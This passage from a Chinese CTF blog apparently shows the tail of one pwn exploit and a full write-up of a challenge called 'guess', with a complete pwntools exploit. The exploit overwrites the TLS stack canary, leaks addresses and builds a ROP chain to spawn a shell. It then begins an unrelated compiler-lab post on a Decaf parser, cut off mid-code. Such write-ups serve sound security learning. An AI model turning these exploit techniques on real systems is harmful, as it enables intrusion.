class="built_in">len</span>(leak_addr), <span class="number">2</span>):</span><br><span class="line">    canary += leak_addr[i+<span class="number">1</span>] + leak_addr[i]</span><br><span class="line">canary = <span class="built_in">eval</span>(<span class="string">&quot;0x&quot;</span>+canary)</span><br><span class="line">success(<span class="string">&quot;canray &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400e93</span></span><br><span class="line">ret = <span class="number">0x00000000004006a6</span></span><br><span class="line"></span><br><span class="line">sl(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span> + p64(canary) + <span class="string">&quot;b&quot;</span>*<span class="number">0x8</span> + p64(pop_rdi_ret) + p64(elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]) + p64(<span class="number">0x4006D0</span>) + p64(<span class="number">0x40089B</span>)</span><br><span class="line">sla(<span class="string">&#x27;Play again? (Y/n) &#x27;</span>,payload)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x23fc0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt;&quot;</span> + <span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span>+ p64(canary) + <span class="string">&quot;b&quot;</span>*<span class="number">0x8</span> + p64(pop_rdi_ret) + p64(binsh) + p64(ret) + p64(system)</span><br><span class="line">sla(<span class="string">&quot;Play again? (Y/n) &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="guess"><a href="#guess" class="headerlink" title="guess"></a>guess</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.27</span><span class="number">-3u</span>buntu1<span class="number">.6</span>)</span> stable release version 2.27.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">guess: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=f21aadafb56dc99d5daac322fec33bd876bbbf3d, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">start_routine</span><span class="params">(<span class="keyword">void</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">24</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  gets(buf);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用了多线程，新线程的栈空间和 TLS 离得很近，可以尝试覆盖 canary</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pthread_create(newthread, <span class="number">0LL</span>, (<span class="keyword">void</span> *(*)(<span class="keyword">void</span> *))start_routine, <span class="number">0LL</span>);</span><br><span class="line">pthread_join(newthread[<span class="number">0</span>], <span class="number">0LL</span>);</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">readu</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%lu&quot;</span>, a1);</span><br><span class="line">  <span class="keyword">return</span> readr(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由于程序使用 scanf 作为输入，因此可以通过 <code>\x00</code> 使 scanf 输入失败，进而不会覆盖栈上的数据</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( numg - <span class="number">1</span> == indexg )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Sorry, that was the last guess!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You entered %lu but the right number was %lu\n&quot;</span>, input, ram);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后就可以将 input 原本所占栈空间的值给泄露出来，计算偏移得到 pro_base</p>
<p>现在有一次栈溢出的机会，比赛时尝试了很多的方法但都失败了：</p>
<ul>
<li>不能使用 printf 泄露数据，可能是覆盖了 TLS 上的关键数据导致 printf 报错</li>
<li>尝试万能 pop 打 csu 时发现程序使用 <code>mov edi, r12d</code>，导致 <code>puts</code> 的第一个参数写不上地址</li>
<li>尝试回到 <code>main start</code> 写循环但又有莫名其妙的报错</li>
<li>尝试执行 <code>pthread_create</code> 也有报错</li>
</ul>
<p>最后发现劫持返回地址为 <code>pro_base + 0x14D9</code> 不会报错，并且能泄露 libc_base：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">24</span> + <span class="string">&quot;\x00&quot;</span>*<span class="number">16</span> </span><br><span class="line"><span class="comment">#payload += csu(0, 1, pthread_create_got, bss_addr, 0, main_addr, csu_front_addr)</span></span><br><span class="line">payload += p64(pop_rdi_ret)+p64(puts_got)+p64(pro_base + <span class="number">0x14D9</span>)</span><br><span class="line">payload += <span class="string">&quot;\x00&quot;</span>*<span class="number">0x800</span>+<span class="string">&quot;\x00&quot;</span>*<span class="number">8</span>*<span class="number">8</span></span><br><span class="line">sla(<span class="string">&quot;&gt; &quot;</span>,payload)</span><br></pre></td></tr></table></figure>
<p>最后打一个 <code>execve(&quot;/bin/sh&quot;)</code> 就可以了</p>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./guess&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x1484)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">size = <span class="number">0x20</span>-<span class="number">9</span></span><br><span class="line">sla(<span class="string">&quot;Enter the size : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">num = <span class="number">2</span></span><br><span class="line">sla(<span class="string">&quot;Enter the number of tries : &quot;</span>,<span class="built_in">str</span>(num))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    sla(<span class="string">&quot;Enter your guess :&quot;</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;You entered &quot;</span>)</span><br><span class="line">leak_addr = <span class="built_in">eval</span>(p.recvuntil(<span class="string">&quot; &quot;</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">pro_base = leak_addr - <span class="number">0x1579</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;pro_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(pro_base))</span><br><span class="line"></span><br><span class="line">bss_addr = pro_base + <span class="number">0x4010</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000001793</span> + pro_base</span><br><span class="line">pop_rsi_ret = <span class="number">0x0000000000001791</span> + pro_base</span><br><span class="line">pop_rbp_ret = <span class="number">0x00000000000012f3</span> + pro_base</span><br><span class="line">call_rax = <span class="number">0x0000000000001014</span> + pro_base</span><br><span class="line"></span><br><span class="line">csu_front_addr=<span class="number">0x1770</span>+pro_base</span><br><span class="line">csu_end_addr=<span class="number">0x178A</span>+pro_base</span><br><span class="line"></span><br><span class="line">print_got = <span class="number">0x3F80</span>+ pro_base</span><br><span class="line">puts_got = <span class="number">0x3F68</span> + pro_base</span><br><span class="line">pthread_create_got = <span class="number">0x3F60</span> + pro_base </span><br><span class="line">main_addr = <span class="number">0x15CF</span> + pro_base</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span>(<span class="params">rbx, rbp, r15,r12, r13, r14, last</span>):</span></span><br><span class="line">    <span class="comment"># pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">    <span class="comment"># rbx should be 0,</span></span><br><span class="line">    <span class="comment"># rbp should be 1,enable not to jump</span></span><br><span class="line">    <span class="comment"># r15 should be the function we want to call(只能是got表地址)</span></span><br><span class="line">    <span class="comment"># rdi=edi=r12d</span></span><br><span class="line">    <span class="comment"># rsi=r13</span></span><br><span class="line">    <span class="comment"># rdx=r14</span></span><br><span class="line">    <span class="comment"># csu(0, 1, fun_got, rdi, rsi, rdx, last)</span></span><br><span class="line">    payload = p64(csu_end_addr) </span><br><span class="line">    payload += p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span>	</span><br><span class="line">    payload += p64(last)	</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">24</span> + <span class="string">&quot;\x00&quot;</span>*<span class="number">16</span> </span><br><span class="line"><span class="comment">#payload += csu(0, 1, pthread_create_got, bss_addr, 0, main_addr, csu_front_addr)</span></span><br><span class="line">payload += p64(pop_rdi_ret)+p64(puts_got)+p64(pro_base + <span class="number">0x14D9</span>)</span><br><span class="line">payload += <span class="string">&quot;\x00&quot;</span>*<span class="number">0x800</span>+<span class="string">&quot;\x00&quot;</span>*<span class="number">8</span>*<span class="number">8</span></span><br><span class="line">sla(<span class="string">&quot;&gt; &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x80970</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">&quot;/bin/sh&quot;</span>))</span><br><span class="line">pop_rdx_ret = libc_base + <span class="number">0x0000000000001b96</span></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x000000000001b500</span></span><br><span class="line">syscall = libc_base + <span class="number">0x0000000000002743</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">24</span> + <span class="string">&quot;\x00&quot;</span>*<span class="number">16</span> </span><br><span class="line">payload += p64(pop_rdi_ret)+p64(binsh_addr)</span><br><span class="line">payload += p64(pop_rdx_ret)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_ret)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rax_ret)+p64(<span class="number">59</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line">sla(<span class="string">&quot;&gt; &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/06/27/CMPT379%E7%BC%96%E8%AF%91%E5%99%A8Lab2%EF%BC%9Adecafast/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/06/27/CMPT379%E7%BC%96%E8%AF%91%E5%99%A8Lab2%EF%BC%9Adecafast/" class="post-title-link" itemprop="url">CMPT379编译器Lab2：decafast</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-06-27 00:40:09 / Modified: 00:43:40" itemprop="dateCreated datePublished" datetime="2023-06-27T00:40:09+08:00">2023-06-27</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>44k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>40 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>decafast</strong></p>
<p>本作业的目标是为 Decaf 编程语言编写一个语法分析器</p>
<p>Decaf 中词汇元素的详细信息在 Decaf 规范中：<a target="_blank" rel="noopener" href="http://anoopsarkar.github.io/compilers-class/decafspec.html">Decaf Programming Language Specification</a> </p>
<p>为 Decaf 语言提供解析器，以生成摘要有效 Decaf 程序的语法树</p>
<ul>
<li>抽象语法树（AST）是程序结构，无需在源代码中包含所有详细信息，它可以被认为是一个抽象的表示</li>
<li>想要生成的抽象语法树，可以使用 <a target="_blank" rel="noopener" href="http://www.oilshell.org/blog/2016/12/11.html">Zehpyr</a> 定义语言（这是一种用于序列化抽象语法树的方法）</li>
</ul>
<p><strong>实验描述</strong></p>
<p>使用 Decaf 规范作为指导，完成一个 Decaf 语言的语法分析器</p>
<p>请务必遵守以下要求：</p>
<ul>
<li>如果程序成功解析输入，则应使用 <code>exit(EXIT_SUCCESS)</code> 退出程序</li>
<li>如果您的程序在输入的无咖啡因程序中发现错误，则应使用 <code>exit(EXIT_FAILURE)</code> 退出</li>
<li>程序生成的抽象语法树必须采用上面指定的格式，输出规范在 <code>/compilers-class-hw/decafast/Decaf.asdl</code> 中提供</li>
<li>不要在输出中添加空格，这可能会导致将输出与参考输出匹配时出现问题</li>
</ul>
<p>使用 Python 程序在测试用例上运行 <code>zipout.py</code> 解决方案程序，您的解决方案必须在目录 <code>answer</code> 中编译，并且必须调用 <code>decaflex</code>，针对所有测试用例运行，如下所示：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 zipout.py</span><br></pre></td></tr></table></figure>
<ul>
<li>这将创建一个名为 <code>output</code> 的目录和一个可以根据参考输出文件进行检查的文件 <code>output.zip</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 check.py </span><br></pre></td></tr></table></figure>
<ul>
<li>这将检查您解决方案的准确性</li>
</ul>
<p><strong>实验步骤</strong></p>
<p>您需要使用在 HW1 中构建的词法分析器，因此需要将 <code>decaflex</code> 中的词法分析器 <code>decaflex.lex</code> 复制到 <code>/compilers-class-hw/decafast/answer</code> 中</p>
<p>目录 <code>/compilers-class-hw/decafast/answer</code> 中存在这个作业的一个不完整的解决方案，本实验要求构造该方案的副本，因此要执行下列命令：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp default.cc decafast.cc</span><br><span class="line">cp default.lex decafast.lex</span><br><span class="line">cp default.y decafast.y</span><br></pre></td></tr></table></figure>
<ul>
<li><code>decafast.cc</code>：修改 <code>#include &quot;default.tab.h&quot;</code> 以替换为 <code>#include &quot;decafast.tab.h&quot;</code></li>
<li><code>decafast.y</code>：修改 <code>#include &quot;default.cc&quot;</code> 以替换为 <code>#include &quot;decafast.cc&quot;</code></li>
<li><code>decafast.lex</code>：仅将令牌模式定义从 HW1 中的 <code>decaflex.lex</code> 复制到 <code>decafast.lex</code>，不要从 <code>main</code> 复制任何内容，因为 <code>decafast.y</code> 中有一个新的 <code>main</code> 函数</li>
<li>PS：T_PACKAGE，T_LCB，T_RCB，T_ID 这4个 token 需使用 <code>default.lex</code> 中的默认值，忽略 T_WHITESPACE</li>
</ul>
<p>通过运行以下命令构建可执行文件 <code>decafast</code>：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make decafast</span><br></pre></td></tr></table></figure>
<p>该实验提供了一个未完成案例 <code>default.y</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;default-defs.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">yylex</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">yyerror</span><span class="params">(<span class="keyword">char</span> *)</span></span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">// print AST?</span></span><br><span class="line"><span class="keyword">bool</span> printAST = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;decafast.cc&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line">%&#125;</span><br><span class="line"></span><br><span class="line">%define parse.error verbose</span><br><span class="line"></span><br><span class="line">%<span class="class"><span class="keyword">union</span>&#123;</span> <span class="comment">// 该样例程序只提供了两个可选类型:树节点,字符串</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">decafAST</span> *<span class="title">ast</span>;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> *sval;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">%token T_PACKAGE</span><br><span class="line">%token T_LCB</span><br><span class="line">%token T_RCB</span><br><span class="line">%token &lt;sval&gt; T_ID</span><br><span class="line"></span><br><span class="line">%type &lt;ast&gt; extern_list decafpackage</span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line">start: program</span><br><span class="line"></span><br><span class="line">program: extern_list decafpackage</span><br><span class="line">    &#123; </span><br><span class="line">        ProgramAST *prog = <span class="keyword">new</span> ProgramAST((decafStmtList *)$<span class="number">1</span>, (PackageAST *)$<span class="number">2</span>); </span><br><span class="line">		<span class="keyword">if</span> (printAST) &#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; getString(prog) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="keyword">delete</span> prog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">extern_list: <span class="comment">/* extern_list can be empty */</span></span><br><span class="line">    &#123; decafStmtList *slist = <span class="keyword">new</span> decafStmtList(); $$ = slist; &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">decafpackage: T_PACKAGE T_ID T_LCB T_RCB</span><br><span class="line">    &#123; $$ = <span class="keyword">new</span> PackageAST(*$<span class="number">2</span>, <span class="keyword">new</span> decafStmtList(), <span 